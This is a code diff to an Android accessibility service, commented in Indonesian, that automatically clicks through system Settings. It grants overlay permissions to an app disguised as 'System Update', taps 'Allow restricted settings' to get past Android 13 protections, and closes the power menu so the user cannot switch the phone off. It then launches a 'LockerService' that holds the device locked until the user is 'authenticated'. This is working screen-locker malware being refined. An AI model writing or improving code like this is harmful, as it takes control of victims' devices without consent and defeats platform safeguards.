@@ -43,69 +43,70 @@ public class CustomAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        writeLog("Event: " + event.getEventType());
         String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
+        String className = event.getClassName() != null ? event.getClassName().toString() : "";
 
-        // 1. Tangani blokir "Restricted Settings" (Android 13+)
-        if (packageName.equals("com.android.settings")) {
-            AccessibilityNodeInfo root = getRootInActiveWindow();
-            if (root != null) {
-                // Klik titik tiga di pojok kanan atas (More options)
-                checkAndClickByContentDesc(root, "More options");
-                checkAndClickByContentDesc(root, "Opsi lain");
-                // Klik "Allow restricted settings"
-                checkAndClick(root, "Allow restricted settings");
-                checkAndClick(root, "Izinkan pengaturan terbatas");
-            }
-        }
-
-        // 2. Deteksi jika menu Power muncul
         if (packageName.equals("android") || packageName.contains("systemui")) {
-            // Jika ada teks terkait mematikan daya, langsung tekan Back
             checkAndDismissPowerMenu(getRootInActiveWindow());
         }
 
         AccessibilityNodeInfo rootNode = getRootInActiveWindow();
         if (rootNode == null) return;
 
-        // Logika "Auto-Clicker"
-        // Cari nama aplikasi di daftar izin overlay
-        checkAndClick(rootNode, "System Update");
+        // 1. Tangani "Restricted Settings" HANYA jika Android 13+ (SDK 33)
+        if (android.os.Build.VERSION.SDK_INT >= 33) {
+            checkAndClickByContentDesc(rootNode, "More options");
+            checkAndClickByContentDesc(rootNode, "Opsi lainnya");
+            checkAndClick(rootNode, "Allow restricted settings");
+            checkAndClick(rootNode, "Izinkan pengaturan terbatas");
+        }
 
-        // Mencari tombol dengan teks tertentu (tergantung bahasa sistem)
+        // 2. Cari nama aplikasi di daftar "Display over other apps"
+        // Batasi agar tidak klik judul di App Info: klik hanya jika dalam list/pengaturan
+        if (packageName.contains("settings") && !className.contains("AppDetails")) {
+            checkAndClick(rootNode, "System Update");
+        }
+
+        // 3. Cari tombol konfirmasi di dialog atau switch
         checkAndClick(rootNode, "Activate");
         checkAndClick(rootNode, "Aktifkan");
         checkAndClick(rootNode, "Allow");
         checkAndClick(rootNode, "Izinkan");
+        checkAndClick(rootNode, "OK");
 
-        // Kata kunci untuk halaman Overlay/Display over other apps
-        checkAndClick(rootNode, "Permit drawing over other apps");
-        checkAndClick(rootNode, "Allow display over other apps");
-        checkAndClick(rootNode, "Izinkan ditampilkan di atas aplikasi lain");
-        checkAndClick(rootNode, "Tampilkan di atas aplikasi lain");
-        
-        // Jika sudah di halaman spesifik overlay, cari switch toggle jika tombol teks tidak ada
-        findAndClickSwitch(rootNode);
-
-        // Jalankan LockerService secara paksa jika izin sudah ada
-        if (Settings.canDrawOverlays(this)) {
-            Intent intent = new Intent(this, LockerService.class);
-            startForegroundService(intent);
+        // 4. Spesifik untuk halaman izin Overlay
+        if (packageName.contains("settings")) {
+            checkAndClick(rootNode, "Permit drawing over other apps");
+            checkAndClick(rootNode, "Allow display over other apps");
+            checkAndClick(rootNode, "Izinkan ditampilkan di atas aplikasi lain");
+            checkAndClick(rootNode, "Tampilkan di atas aplikasi lain");
         }
 
-        rootNode.recycle();
+        // Cari switch toggle jika belum ON
+        findAndClickSwitch(rootNode);
+
+        // 5. Jika izin Overlay sudah aktif, jalankan Locker
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            if (Settings.canDrawOverlays(this) && !LockerService.isAuthenticated) {
+                Intent intent = new Intent(this, LockerService.class);
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                    startForegroundService(intent);
+                } else {
+                    startService(intent);
+                }
+            }
+        }, 1000);
+
     }
 
     private void checkAndClickByContentDesc(AccessibilityNodeInfo node, String desc) {
-        List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByViewId("android:id/button1"); // Sering digunakan untuk OK dialog
-        for (AccessibilityNodeInfo n : node.findAccessibilityNodeInfosByText(desc)) { clickNode(n); }
-        // Cari berdasarkan content description (untuk tombol gambar/tiga titik)
-        if (node.getContentDescription() != null && node.getContentDescription().toString().contains(desc)) {
+        if (node == null) return;
+        if (node.getContentDescription() != null && 
+            node.getContentDescription().toString().toLowerCase().contains(desc.toLowerCase())) {
             clickNode(node);
         }
         for (int i = 0; i < node.getChildCount(); i++) {
-            AccessibilityNodeInfo child = node.getChild(i);
-            if (child != null) checkAndClickByContentDesc(child, desc);
+            checkAndClickByContentDesc(node.getChild(i), desc);
         }
     }
 
